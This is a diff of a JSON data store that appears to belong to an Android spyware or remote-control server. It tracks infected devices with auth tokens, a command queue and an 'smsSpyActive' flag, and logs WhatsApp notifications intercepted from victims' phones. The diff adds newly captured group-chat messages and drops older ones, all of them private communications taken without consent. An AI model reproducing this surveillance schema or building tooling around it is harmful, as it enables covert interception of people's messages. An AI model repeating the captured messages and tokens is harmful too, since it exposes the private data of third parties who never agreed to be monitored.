@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775048521901,
+    "lastSeen": 1775048525016,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎14472 pesan dari 10 chat",
+        "time": "01/04 21:02",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775048522339
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (13941 pesan): ~ Fegg",
@@ -4011,14 +4019,6 @@
         "time": "01/04 20:37",
         "pkg": "com.whatsapp",
         "receivedAt": 1775047040711
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (13790 pesan): ~ Bot",
-        "content": "📷 𐔈⃘ ֹ ׅ 🍓 ֹ Brat Generator ֹ ׅ ୫\n╭╼─┈───┈──⏣╼╯\n┆✿᪲ ׄ𖹭₊ Teks : ikan sepat ikan hiu, I love u, anjay\n╰─╼𔕬─┈───┈───┈",
-        "time": "01/04 20:37",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775047040627
       }
     ],
     "galleryPhotos": [],
@@ -4049,7 +4049,7 @@
     "deviceName": "HP-AIM-22BD",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "ee7716168abf03ae6470b12578967076",
-    "lastSeen": 1775048521095,
+    "lastSeen": 1775048524175,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:33:59.233Z",
@@ -4065,6 +4065,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13942 pesan): ~ Gisellee",
+        "content": "y elah",
+        "time": "01/04 21:02",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775048525931
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎14472 pesan dari 10 chat",
+        "time": "01/04 21:02",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775048522362
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (13941 pesan): ~ Fegg",
@@ -8048,22 +8064,6 @@
         "time": "01/04 20:37",
         "pkg": "com.whatsapp",
         "receivedAt": 1775047043068
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (13791 pesan): ~ Ciaaa^^",
-        "content": "Jenis pesan tidak diketahui",
-        "time": "01/04 20:37",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775047043024
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎15959 pesan dari 11 chat",
-        "time": "01/04 20:37",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775047040738
       }
     ],
     "galleryPhotos": [],
